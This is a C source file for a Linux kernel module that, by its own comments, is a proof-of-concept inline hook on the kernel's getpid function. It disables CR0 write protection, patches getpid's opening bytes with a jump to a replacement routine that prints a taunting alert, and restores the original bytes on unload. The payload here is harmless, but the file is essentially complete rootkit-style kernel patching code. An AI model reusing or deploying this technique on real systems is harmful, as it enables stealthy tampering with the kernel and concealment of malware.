#include <linux/init.h>
#include <linux/mman.h>
#include <linux/module.h>
#include <linux/spinlock.h>
MODULE_LICENSE("GPL");

#define JMP_BYTES 7

void *_memcpy(void *dest, const void *src, int bytes);
long (*getpid)(void) = (void *)0xC1067F20;  //addr is system-specific

//spinlock to protect fancy footwork required to call the original function
spinlock_t gp_spin = SPIN_LOCK_UNLOCKED;

//original and replacement instructions at getpid
static char orig_instr[JMP_BYTES];
static char repl_instr[JMP_BYTES] = "\xb8\x00\x00\x00\x00"  //mov eax, 0
                                    "\xff\xe0";             //jmp eax

/*New sys_getpid function.
 *This is a proof of concept, so there's no need to be mean here--just print an
 *alert.
 */
asmlinkage long hacked_getpid(void) {
  long pid;  //sys_getpid return value

  printk(KERN_ALERT "All your base are belong to us.\n");

  /* Critical Section */
  spin_lock(&gp_spin);

    //call original getpid function
    write_cr0 (read_cr0 () & (~0x10000));    //disable write-protection
    _memcpy(getpid, orig_instr, JMP_BYTES);  //restore original bytes
    pid = getpid();                          //call original getpid
    _memcpy(getpid, repl_instr, JMP_BYTES);  //overwrite original bytes
    write_cr0 (read_cr0 () | 0x10000);       //reenable write-protection

  spin_unlock(&gp_spin);
  /* End Critical Section */

  return pid;
}

/*Copies bytes from the specified source to the specified destination.
 */
void *_memcpy(void *dest, const void *src, int bytes) {
  const char *s = src;
  char *d = dest;

  //swap memory, one byte at a time
  register int i;
  for (i = 0; i < bytes; ++i) *d++ = *s++;

  return dest;
}

/*Module initialization.
 */
static int asm_init(void) {

  //get addr of hacked_getpid into asm framework
  *(long *)&repl_instr[1] = (long)hacked_getpid;

  //save original bytes at getpid
  _memcpy(orig_instr, getpid, JMP_BYTES);

  //overwrite bytes at get_pid with jump
  write_cr0 (read_cr0 () & (~0x10000));    //disable write-protection
  _memcpy(getpid, repl_instr, JMP_BYTES);  //overwrite original bytes
  write_cr0 (read_cr0 () | 0x10000);       //reenable write-protection

  return 0;
}

/*Module clean-up.
 */
static void asm_exit(void) {

  //restore original getpid bytes
  write_cr0 (read_cr0 () & (~0x10000));    //disable write-protection
  _memcpy(getpid, orig_instr, JMP_BYTES);  //restore original bytes
  write_cr0 (read_cr0 () | 0x10000);       //reenable write-protection
}

module_init(asm_init);
module_exit(asm_exit);
